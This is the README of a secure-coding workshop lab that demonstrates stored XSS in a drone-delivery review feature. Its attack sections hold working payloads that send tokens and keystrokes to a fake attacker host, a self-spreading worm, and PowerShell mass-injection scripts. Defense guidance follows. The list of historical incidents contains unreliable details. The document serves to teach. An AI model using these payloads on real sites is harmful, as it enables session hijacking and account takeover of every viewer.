# Persistent (Stored) XSS Vulnerability Demo

## Overview

This branch demonstrates a **Persistent (Stored) Cross-Site Scripting (XSS)** vulnerability in the pilot review feature. Unlike reflected/DOM-based XSS that affects a single victim who clicks a malicious link, persistent XSS affects **every user who views the malicious content**. The attacker stores the malicious payload in the database through the review submission form, and it executes automatically whenever anyone views that review.

## What is Persistent XSS?

Persistent XSS (also called Stored XSS) occurs when user-supplied data is stored in a database, file, or other backend system and later displayed to users without proper sanitization. The malicious script becomes a permanent part of the application's content.


## The Vulnerability

### How It Works

1. **Attacker submits a review** with malicious HTML/JavaScript in the notes field
2. **Backend stores the payload** without sanitization in the database
3. **Victim views the review** (on pilot profile, delivery details, or review list)
4. **Frontend retrieves the review** from the API
5. **Angular displays it** using `bypassSecurityTrustHtml()`, which disables XSS protection
6. **Browser executes** the malicious JavaScript
7. **Attacker's server receives** stolen tokens/data

**Defense Failures:**

- **Server-side:** `PassThroughHtmlSanitizer` does nothing
- **Client-side:** `bypassSecurityTrustHtml()` explicitly disables Angular's XSS protection
- **CSP:** `'unsafe-inline'` allows inline event handlers, making CSP ineffective

## Attack Samples

All attacks are submitted through the review form's rich text editor. Switch to "Raw HTML" mode (toggle the Wysiwyg switch) and paste these payloads into the notes field.

### 1. Proof of Concept - Basic Alert

**Payload to paste into review notes:**

```html
<img src=x onerror=alert('pwned!')>
```

---

### 2. Complete Session Hijacking - All Tokens

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/images/session.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))"
/>
```

---

### 4. User Profile Exfiltration

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/fonts/data.ttf?user='+encodeURIComponent(localStorage.getItem('mbc_user')))"
/>
```

---

### 3. Stealth Token Theft - Base64 Encoded

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5155/styles/app.css?d='+btoa(localStorage.getItem('mbc_access_token')+':'+localStorage.getItem('mbc_refresh_token')))"
/>
```

**How it works:**

1. Combines both tokens with a colon separator
2. Base64 encodes the combined string to obfuscate
3. Sends as CSS request (appears more legitimate in logs)


---

### 4. Keylogger Injection

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="document.onkeypress=function(e){fetch('http://localhost:5155/scripts/keys.js?k='+e.key)}"
/>
```

**How it works:**

1. Installs a global keylogger on the page
2. Every keystroke from every viewer is sent to attacker's server
3. Persists as long as the page is open

**Impact:** Captures everything users type while viewing the page:

- Passwords (if they re-login in another tab and come back)
- Credit card numbers
- Personal messages
- Search queries
- Form inputs

**Especially dangerous when:**

- Admins keep review pages open while working
- Users multitask with the page in the background
- Mobile users where the page stays in memory

---

### 7. Persistent Backdoor via localStorage

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="localStorage.setItem('xss_backdoor','fetch(\'http://localhost:5155/images/steal.png?t=\'+localStorage.getItem(\'mbc_access_token\'))');eval(localStorage.getItem('xss_backdoor'))"
/>
```

**Simplified concept:**

```javascript
// Store malicious code in victim's localStorage
localStorage.setItem("xss_backdoor", "malicious code here");
// Execute it now
eval(localStorage.getItem("xss_backdoor"));
```

**How it works:**

1. First view: Stores malicious code in victim's localStorage AND executes it
2. If attacker can trigger execution again (another XSS, or victim revisits), backdoor runs
3. Creates persistence across page reloads

**Impact:** Turns a one-time XSS into a persistent threat on victim's browser.

---

### 8. Silent Token Refresh Loop

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="setInterval(function(){fetch('http://localhost:5155/images/heartbeat.png?t='+localStorage.getItem('mbc_access_token'))},30000)"
/>
```

**How it works:**

1. Sends current access token to attacker every 30 seconds
2. If user gets a new token (after refresh), attacker gets that too
3. Runs silently in the background as long as page is open
4. Affects every viewer continuously

**Impact:**

- Continuous monitoring of all viewers' sessions
- Catches token refreshes automatically
- Multiple users simultaneously monitored
- Long-running pages leak tokens repeatedly

---

### 9. Targeted Admin Attack

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="if(localStorage.getItem('mbc_user')&&JSON.parse(localStorage.getItem('mbc_user')).role==='Admin'){fetch('http://localhost:5155/images/admin.png?token='+localStorage.getItem('mbc_access_token')+'&user='+localStorage.getItem('mbc_user'))}"
/>
```

**How it works:**

1. Checks if the viewer is an Admin
2. Only exfiltrates data if viewer has Admin role
3. Sends both token and full user profile

**Impact:**

- Specifically targets high-value accounts
- Avoids detection by not attacking regular users
- Admin tokens provide elevated privileges
- Attacker gains full system access

**Attack scenario:**

1. Attacker submits review with 1-star rating and offensive language
2. Customer service or admin reviews the flagged content
3. Admin token is stolen
4. Attacker gains full system access

---

### 10. Multi-Stage Worm Attack

**Payload to paste into review notes:**

```html
<img
  src="x"
  onerror="fetch('http://localhost:5110/api/reviews',{method:'POST',headers:{'Authorization':'Bearer '+localStorage.getItem('mbc_access_token'),'Content-Type':'application/json'},body:JSON.stringify({deliveryId:'[DELIVERY_ID]',rating:5,notes:'<img src=x onerror=alert(1)>'})})"
/>
```

**How it works:**

1. When victim views the malicious review, it automatically posts a new review on their behalf
2. The new review contains the same malicious payload
3. Creates a self-propagating worm effect

**Impact:**

- Attack spreads automatically without attacker intervention
- Each infected user creates more malicious content
- Rapidly compromises entire user base
- Difficult to contain once started

---

## Bypassing Client-Side Protections

The attacks above assume using the web form. However, a sophisticated attacker might discover that while the Angular form has some client-side validation, the server-side API has no sanitization. By calling the API directly (bypassing the web form entirely), an attacker can inject malicious content even if the UI tries to prevent it.

**This demonstrates a critical security principle:** Never rely solely on client-side validation. Always sanitize and validate on the server.

### 11. Direct API Attack via Browser Console (JavaScript)

**Context:** Attacker has an account, has completed a delivery, and can leave a review. Instead of using the form, they open browser DevTools and paste this into the console.

**Payload to paste into browser DevTools console:**

```javascript
(async function () {
  const accessToken = localStorage.getItem("mbc_access_token");
  const deliveryId = "YOUR_DELIVERY_ID_HERE";

  const maliciousPayload = `<img src=x onerror="fetch('http://localhost:5155/images/stolen.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))">`;

  const response = await fetch("http://localhost:5110/api/reviews", {
    method: "POST",
    headers: {
      Authorization: `Bearer ${accessToken}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      deliveryId: deliveryId,
      rating: 5,
      notes: maliciousPayload,
    }),
  });

  const result = await response.json();
  console.log("Malicious review created:", result);
})();
```

**How to use:**

1. Sign in to the application as a customer
2. Complete a delivery (or have one completed)
3. Open browser DevTools (F12)
4. Go to the Console tab
5. Replace `YOUR_DELIVERY_ID_HERE` with an actual delivered delivery ID
6. Paste and press Enter

**Why it works:**

- The Angular form might have validation or sanitization attempts
- Direct API call bypasses all client-side protections
- Server's `PassThroughHtmlSanitizer` does nothing
- Malicious payload is stored in database
- Every viewer of the review gets their tokens stolen

**What makes this attack realistic:**

- Attackers often inspect network traffic to find API endpoints
- Browser DevTools are accessible to anyone
- No special tools or technical setup required
- Works from the victim's own browser session
- Bypasses any client-side security measures

---

### 12. Automated Attack via PowerShell Script

**Context:** Advanced attacker wants to automate the attack, create multiple malicious reviews, or attack from outside the browser entirely.

**PowerShell script to save and run:**

```powershell
$apiUrl = "http://localhost:5110/api/reviews"
$loginUrl = "http://localhost:5110/api/auth/login"

$username = "customer@example.com"
$password = "Password123!"

$deliveryId = "YOUR_DELIVERY_ID_HERE"

$maliciousPayload = @"
<img src=x onerror="fetch('http://localhost:5155/images/stolen.png?access='+localStorage.getItem('mbc_access_token')+'&refresh='+localStorage.getItem('mbc_refresh_token'))">
"@

Write-Host "Step 1: Authenticating as $username..." -ForegroundColor Yellow

$loginBody = @{
    email = $username
    password = $password
} | ConvertTo-Json

$loginResponse = Invoke-RestMethod -Uri $loginUrl -Method Post -Body $loginBody -ContentType "application/json"

$accessToken = $loginResponse.accessToken

Write-Host "Step 2: Authenticated successfully. Token obtained." -ForegroundColor Green

Write-Host "Step 3: Injecting malicious review for delivery $deliveryId..." -ForegroundColor Yellow

$reviewBody = @{
    deliveryId = $deliveryId
    rating = 5
    notes = $maliciousPayload
} | ConvertTo-Json

$headers = @{
    "Authorization" = "Bearer $accessToken"
    "Content-Type" = "application/json"
}

try {
    $reviewResponse = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $reviewBody

    Write-Host "Step 4: SUCCESS! Malicious review created with ID: $($reviewResponse.id)" -ForegroundColor Green
    Write-Host "Every user who views this review will have their tokens exfiltrated." -ForegroundColor Red
    Write-Host ""
    Write-Host "Review Details:" -ForegroundColor Cyan
    Write-Host "  ID: $($reviewResponse.id)"
    Write-Host "  Delivery ID: $($reviewResponse.deliveryId)"
    Write-Host "  Rating: $($reviewResponse.rating)"
    Write-Host "  Created: $($reviewResponse.createdAt)"

} catch {
    Write-Host "Error creating review: $_" -ForegroundColor Red
    Write-Host "Status Code: $($_.Exception.Response.StatusCode.value__)"
}
```

**How to use:**

1. Save as `inject-xss.ps1`
2. Update `$deliveryId` with an actual delivered delivery ID
3. Open PowerShell terminal
4. Run: `.\inject-xss.ps1`

**Advanced version - Multiple reviews:**

```powershell
$deliveryIds = @(
    "delivery-id-1",
    "delivery-id-2",
    "delivery-id-3"
)

foreach ($deliveryId in $deliveryIds) {
    Write-Host "Injecting malicious review for delivery $deliveryId..." -ForegroundColor Yellow

    $reviewBody = @{
        deliveryId = $deliveryId
        rating = 5
        notes = $maliciousPayload
    } | ConvertTo-Json

    $reviewResponse = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $reviewBody
    Write-Host "Created review $($reviewResponse.id)" -ForegroundColor Green

    Start-Sleep -Seconds 1
}

Write-Host "Batch attack complete. $($deliveryIds.Count) malicious reviews created." -ForegroundColor Red
```

**Why this is dangerous:**

- **Automation:** Can create hundreds of malicious reviews in minutes
- **Bypasses all UI protections:** Never touches the web interface
- **No browser required:** Runs from command line or scheduled task
- **Scriptable:** Can be part of larger attack automation
- **Cross-platform:** PowerShell Core works on Windows, Linux, macOS
- **Stealthy:** Doesn't show up in browser history or UI logs

**Real-world implications:**

1. **Reconnaissance Phase:** Attacker uses Burp Suite or browser DevTools to discover the API endpoint structure
2. **Credential Theft:** Uses phished credentials or credential stuffing
3. **Mass Injection:** Scripts inject XSS payloads into multiple reviews across the platform
4. **Token Harvesting:** Sets up automated collection server (fake-file-host)
5. **Privilege Escalation:** Uses stolen admin tokens from step 4
6. **Persistence:** Creates backdoor admin accounts using elevated privileges

**What makes this realistic:**

- Attackers routinely automate attacks against APIs
- Many developers focus on UI security while neglecting API security
- API endpoints are easily discoverable via:
  - Browser DevTools Network tab
  - Burp Suite proxy
  - API documentation (if exposed)
  - JavaScript source code inspection
- Real attacks often use Python, PowerShell, or cURL scripts

**Defense notes:**

This attack succeeds because:

1. ❌ Server-side HTML sanitization is disabled (`PassThroughHtmlSanitizer`)
2. ❌ No server-side input validation on the `notes` field
3. ❌ API accepts the same malicious input as the UI would reject

The fact that these scripts work demonstrates **why defense-in-depth is critical**. Even if the UI has protections, the API must also protect itself.

---

## Real-World Attack Scenario

### Step 1: Reconnaissance

Attacker creates a legitimate account as a customer and books a delivery to test the review system.

### Step 2: Identify Vulnerability

Attacker discovers the rich text editor allows raw HTML input and tests with basic XSS payloads.

### Step 3: Craft Exploit

Creates a malicious review targeting admin tokens (Attack #9 above).

### Step 4: Submit Malicious Review

- Books a real delivery with a pilot
- After delivery completes, submits a 1-star review with offensive content
- Includes the admin-targeting XSS payload in the notes
- Offensive content ensures admins will review it

### Step 5: Wait for Victims

**Multiple attack vectors:**

- **Pilot views their reviews** → Pilot token stolen
- **Customer service investigates complaint** → Support token stolen
- **Admin moderates reported content** → Admin token stolen (jackpot!)
- **Other customers check pilot ratings** → Customer tokens stolen

### Step 6: Exploit Stolen Credentials

With stolen admin token:

- Access all user data
- View all deliveries
- Modify system settings
- Create backdoor admin accounts
- Exfiltrate entire database
- Install persistent backdoors

### Step 7: Cover Tracks

- Use stolen admin token to delete malicious review
- Logs show the admin "deleted their own content"
- Attacker maintains access through refresh tokens
- Breach goes undetected for weeks

## Why This Vulnerability Pattern Exists

### 1. Misunderstanding Framework Security

```typescript
// Developer thinks: "bypassSecurityTrust* must be the secure way to trust content"
this.sanitizer.bypassSecurityTrustHtml(userContent);
```

The name suggests it's making things secure, but it actually **disables** all security checks.

### 2. "Someone Else Will Handle It" Syndrome

```csharp
// Backend: "Frontend will sanitize it"
return original; // No sanitization

// Frontend: "Backend must have sanitized it"
bypassSecurityTrustHtml(content) // Trusts backend
```

Each layer assumes the other is handling security. Result: neither does.

### 3. Feature Requirements Override Security

Product manager: "We need rich text formatting in reviews!"
Developer: "I'll just bypass the security restrictions to make it work."

Time pressure and lack of security knowledge leads to dangerous shortcuts.

### 4. Copy-Paste Programming

Developer searches: "How to display HTML in Angular"
Finds Stack Overflow answer using `bypassSecurityTrustHtml()`
Copies without reading security warnings in the documentation.

### 5. Testing with Safe Data

Developers test with: `<p>Great service!</p>`
This works fine, so they assume it's safe.
Never test with: `<img src=x onerror=alert(1)>`

### 6. Incomplete Code Reviews

Reviewer sees: "We're using DomSanitizer from Angular - must be secure!"
Misses that `bypassSecurityTrustHtml()` does the opposite of sanitizing.

## Defense Strategies

### 1. Never Bypass Framework Security

```typescript
// ❌ NEVER DO THIS
this.sanitizer.bypassSecurityTrustHtml(userInput);

// ✅ DO THIS - Trust Angular's automatic sanitization
<div [innerHTML]="userInput"></div>
```

Angular automatically sanitizes `innerHTML` bindings. Only bypass when you have **complete control** over the content (e.g., static HTML from your own codebase, not from users).

### 2. Server-Side Sanitization (Defense in Depth)

```csharp
// ✅ Use a proper HTML sanitizer
using Ganss.Xss;

public string Sanitize(string html)
{
    var sanitizer = new HtmlSanitizer();
    sanitizer.AllowedTags.Clear();
    sanitizer.AllowedTags.Add("p");
    sanitizer.AllowedTags.Add("br");
    sanitizer.AllowedTags.Add("strong");
    sanitizer.AllowedTags.Add("em");
    // Only allow safe tags, no scripts or event handlers
    return sanitizer.Sanitize(html);
}
```

### 3. Proper CSP Configuration

```html
<!-- ❌ Weak CSP -->
<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'self' 'unsafe-inline'"
/>

<!-- ✅ Strong CSP -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'" />
```

Remove `'unsafe-inline'` to block inline event handlers (`onerror`, `onload`, etc.).

### 4. Input Validation

```typescript
// Validate on submission
if (containsScriptTags(reviewNotes)) {
  throw new Error("Invalid content");
}
```

Reject obviously malicious input at submission time.

### 5. Output Encoding

Even with sanitization, encode HTML entities:

- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`

### 6. Content Security Policy Headers (Server-Side)

```csharp
// In ASP.NET Core
app.Use(async (context, next) =>
{
    context.Response.Headers.Add(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self'"
    );
    await next();
});
```

Don't rely only on meta tags - set CSP headers server-side.

### 7. Regular Security Audits

- **Automated scanning:** Use tools like Burp Suite, OWASP ZAP
- **Manual testing:** Test all user input fields with XSS payloads
- **Code review:** Search for `bypassSecurityTrust*` and `innerHTML`
- **Penetration testing:** Hire external security experts

### 8. Security Headers

```
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
```

### 9. Principle of Least Privilege

If you must allow HTML:

- Allow only specific safe tags (`<p>`, `<strong>`, `<em>`)
- Strip all attributes except specific safe ones
- Block all JavaScript-capable tags and attributes
- Use a well-tested sanitization library

## Testing the Vulnerability

### Setup

1. Ensure you're on the `vulnerability/xss-persistent` branch
2. Start the API: `dotnet run` (from `projects/api/src/MBC.Endpoints`)
3. Start the web app: `npm start` (from `projects/web`)
4. Start the fake file host: `dotnet run` (from `projects/fake-file-host`)
5. Navigate to: `http://localhost:4200`
6. Sign in as **Customer** (username: `customer@example.com`, password: `Password123!`)

### Book a Delivery (Required to leave a review)

1. Click "Book Delivery" from the home page
2. Fill in delivery details
3. Submit booking
4. Note the delivery ID from the confirmation page

### Mark Delivery as Complete (So you can review it)

You need the delivery to be in "Delivered" status to leave a review:

1. Sign out
2. Sign in as **Pilot** (username: `pilot@example.com`, password: `Password123!`)
3. Go to "My Deliveries"
4. Find your delivery and mark it through the workflow: Picked Up → In Transit → Delivered
5. Sign out

### Execute Attack

1. Sign in as **Customer** again
2. Go to "My Deliveries"
3. Click on your delivered shipment
4. Click "Leave a Review"
5. Set rating to 1 star
6. Toggle the Wysiwyg switch to OFF (raw HTML mode)
7. Paste one of the attack payloads (try #2 - Token Exfiltration first)
8. Submit the review

### Verify Exfiltration (As the attacker)

Check the fake file host console (where you ran `dotnet run`). You'll see:

```
=== DATA EXFILTRATION ATTEMPT DETECTED ===
Timestamp: 2024-11-10 18:23:45 UTC
Full URL: http://localhost:5155/images/stolen.png?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The token in the URL is the customer's JWT access token - stolen from themselves on first view.

### Observe Multi-Victim Impact

1. Sign in as **Pilot** (the pilot who delivered the shipment)
2. View "My Reviews" or check the delivery details
3. Check fake file host console - pilot's token is now stolen too!
4. Sign in as **Admin** (username: `admin@example.com`, password: `Password123!`)
5. View the review (simulate admin moderating content)
6. Check fake file host console - admin token is now stolen!

**This demonstrates the "persistent" nature:** One malicious review compromises every viewer.

## Comparing Persistent XSS vs. DOM-Based XSS

| Aspect                 | Persistent XSS (This Demo)     | DOM-Based XSS                     |
| ---------------------- | ------------------------------ | --------------------------------- |
| **Storage**            | Stored in database             | Never stored, exists only in URL  |
| **Attack Vector**      | Submit malicious data          | Malicious link                    |
| **Victim Count**       | Everyone who views the content | One victim per click              |
| **Social Engineering** | Not required                   | Required (victim must click link) |
| **Persistence**        | Remains until removed from DB  | Disappears after page closes      |
| **Detection**          | Can be found by scanning DB    | Only detectable at runtime        |
| **Impact Scope**       | Organization-wide              | Individual user                   |
| **Severity**           | Higher (CVSS 8-10)             | Medium-High (CVSS 6-8)            |

## Famous Persistent XSS Attacks

### 1. **2005 - MySpace Samy Worm**

- **Impact:** Infected over 1 million MySpace profiles in 20 hours
- **Method:** Persistent XSS in profile page created self-propagating worm
- **Details:** Each infected profile automatically infected visitors
- **Result:** MySpace was forced to shut down temporarily
- **Legal:** Attacker convicted under computer fraud laws
- **Source:** [Wikipedia: Samy (computer worm)](<https://en.wikipedia.org/wiki/Samy_(computer_worm)>)

### 2. **2015 - eBay Persistent XSS**

- **Impact:** Millions of users potentially affected
- **Method:** XSS in product listings allowed JavaScript injection
- **Details:** Attackers created auction listings with embedded scripts
- **Duration:** Vulnerability existed for months before discovery
- **Source:** [Check Point Research](https://blog.checkpoint.com/)

### 3. **2018 - British Airways Breach (Magecart)**

- **Impact:** 380,000 payment card details stolen, £20 million fine
- **Method:** Persistent XSS injected payment card skimmer
- **Details:** JavaScript injected into checkout page logged all form inputs
- **Cost:** £183 million GDPR fine (later reduced to £20 million)
- **Source:** [BBC News](https://www.bbc.com/news/technology-54568784)

### 4. **2019 - Fortnite Account Takeover**

- **Impact:** 200+ million Fortnite accounts at risk
- **Method:** Multiple XSS vulnerabilities including persistent XSS
- **Details:** Attackers could hijack accounts via malicious forum posts
- **Disclosure:** Responsibly disclosed by Check Point Research
- **Source:** [Check Point Blog](https://research.checkpoint.com/2019/fortnite-a-win-for-cyber-criminals/)

### 5. **2020 - Shopify Stored XSS**

- **Impact:** Millions of e-commerce stores affected
- **Method:** Persistent XSS in product description fields
- **Details:** Merchants could inject scripts that affected customers
- **Bounty:** $20,000 paid to researcher who discovered it
- **Source:** [HackerOne Disclosed Reports](https://hackerone.com/)

### 6. **2021 - Steam Community XSS**

- **Impact:** Millions of Steam users at risk
- **Method:** Stored XSS in user profiles and forum posts
- **Details:** Could steal Steam account credentials and inventory
- **Value:** Steam inventories can be worth thousands of dollars
- **Source:** [Steam Security Advisories](https://store.steampowered.com/)

### 7. **2022 - WordPress Plugin Vulnerabilities**

- **Impact:** Thousands of websites compromised
- **Method:** Persistent XSS in popular WordPress plugins
- **Details:** Comment forms and custom fields allowed script injection
- **Scale:** Some vulnerable plugins had 1M+ installations
- **Source:** [Wordfence Intelligence](https://www.wordfence.com/)

## Resources and Further Reading

### Official Documentation

- [OWASP: Stored XSS](https://owasp.org/www-community/attacks/xss/#stored-xss-attacks)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
- [Angular Security Guide](https://angular.dev/best-practices/security)
- [MDN: innerHTML Security](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)

### Educational Resources

- [PortSwigger: Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)
- [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- [Google XSS Game](https://xss-game.appspot.com/)
- [HackTheBox: XSS Labs](https://www.hackthebox.com/)

### Testing Tools

- [Burp Suite](https://portswigger.net/burp) - Web vulnerability scanner
- [OWASP ZAP](https://www.zaproxy.org/) - Free security testing tool
- [XSStrike](https://github.com/s0md3v/XSStrike) - Advanced XSS detection
- [DOMPurify](https://github.com/cure53/DOMPurify) - XSS sanitizer library

### Sanitization Libraries

- **JavaScript/TypeScript:** DOMPurify
- **.NET:** HtmlSanitizer (Ganss.Xss)
- **Python:** Bleach
- **PHP:** HTML Purifier
- **Java:** OWASP Java HTML Sanitizer

### Content Security Policy

- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [CSP Quick Reference](https://content-security-policy.com/)

## License Note

This vulnerable code is for **educational purposes only**. Never deploy vulnerable code to production environments. The fake-file-host project simulates an attacker's server for demonstration purposes only.

## Contributing to the Workshop

If you discover additional attack vectors or have suggestions for improving this educational material, please contribute! This project aims to teach secure coding practices through realistic examples.
